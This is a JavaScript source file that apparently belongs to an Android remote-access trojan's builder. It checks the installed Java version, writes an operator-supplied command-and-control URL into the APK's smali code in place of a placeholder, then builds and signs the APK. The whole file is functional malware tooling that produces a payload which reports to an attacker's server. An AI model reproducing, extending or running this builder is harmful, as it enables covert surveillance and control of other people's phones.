const
    cp = require('child_process'),
    fs = require('fs'),
    CONST = require('./const');

// Thanks -> https://stackoverflow.com/a/19734810/7594368
// This function is a pain in the arse, so many issues because of it! -- hopefully this fix, fixes it!
function javaversion(callback) {
    let spawn = cp.spawn(CONST.javaBin, ['-version']);
    let output = "";
    spawn.on('error', (err) => callback("Unable to spawn Java - " + err, null));
    spawn.stderr.on('data', (data) => {
        output += data.toString();
    });
    spawn.on('close', function (code) {
        let javaIndex = output.indexOf('java version');
        let openJDKIndex = output.indexOf('openjdk version');
        let javaVersion = (javaIndex !== -1) ? output.substring(javaIndex, (javaIndex + 27)) : "";
        let openJDKVersion = (openJDKIndex !== -1) ? output.substring(openJDKIndex, (openJDKIndex + 27)) : "";
        if (javaVersion !== "" || openJDKVersion !== "") {
            if (javaVersion.includes("1.8.0") || openJDKVersion.includes("1.8.0")) {
                spawn.removeAllListeners();
                spawn.stderr.removeAllListeners();
                return callback(null, (javaVersion || openJDKVersion));
            } else return callback("Wrong Java Version Installed. Detected " + (javaVersion || openJDKVersion) + ". Please use Java 1.8.0", undefined);
        } else return callback("Java Not Installed", undefined);
    });
}

function patchAPK(url, cb) {
    // Accept either a full URL or legacy URI + PORT pair for backwards compatibility
    if (typeof url === 'string') {
        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
            if (err) return cb('File Patch Error - READ')
            // Replace the C2URL placeholder (everything before ?model=) with the supplied endpoint
            var result = data.replace(/const-string v3, "[^"]*\?model="/, 'const-string v3, "' + url + '?model="');
            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                if (err) return cb('File Patch Error - WRITE')
                else return cb(false)
            });
        });
    } else return cb('Invalid URL');
}

function patchAPKLegacy(URI, PORT, cb) {
    if (PORT < 25565) {
        patchAPK('http://' + URI + ':' + PORT, cb);
    }
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
            if (error) return cb('Build Command Failed - ' + error.message);
            else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
                if (!error) return cb(false);
                else return cb('Sign Command Failed - ' + error.message);
            });
        });
        else return cb(err);
    })
}

module.exports = {
    buildAPK,
    patchAPK
}
